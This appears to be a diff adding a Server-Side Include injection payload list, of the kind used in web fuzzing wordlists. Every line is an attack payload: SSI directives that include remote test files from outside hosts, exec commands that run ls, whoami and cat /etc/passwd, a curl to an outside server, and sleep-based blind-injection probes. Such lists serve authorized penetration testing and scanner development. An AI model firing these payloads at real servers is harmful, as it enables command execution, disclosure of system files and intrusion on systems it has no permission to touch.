@@ -1,0 +1,18 @@
+</nowiki>
+<!--#echo var="DOCUMENT_NAME" -->
+<!--#echo var="DOCUMENT_URI" -->
+<!--#config timefmt="A %B %d %Y %r"-->
+<!--#echo var="DATE_LOCAL" -->
+<!--#include virtual="http://xerosecurity.com/.testing/rfi_vuln.php" -->
+<!--#include virtual="https://crowdshield.com/.testing/rfi_vuln.php" -->
+<!--#include virtual="/" -->
+<!--#exec cmd="ls" -->
+<!--#exec cmd="whoami" -->
+<!--#exec cmd="uname" -->
+<!--#exec cmd="dir" -->
+<!--#exec cmd="cat /etc/passwd" -->
+<!--#exec cmd="ipconfig" -->
+<!--#exec cmd="curl http://xerosecurity.com/.testing/rfi_vuln.php" -->
+<!--#exec cmd="perl -e 'print "X"*5000'" -->
+<!--#exec cmd="sleep 5" -->
+<!--#exec cmd="sleep 10" -->
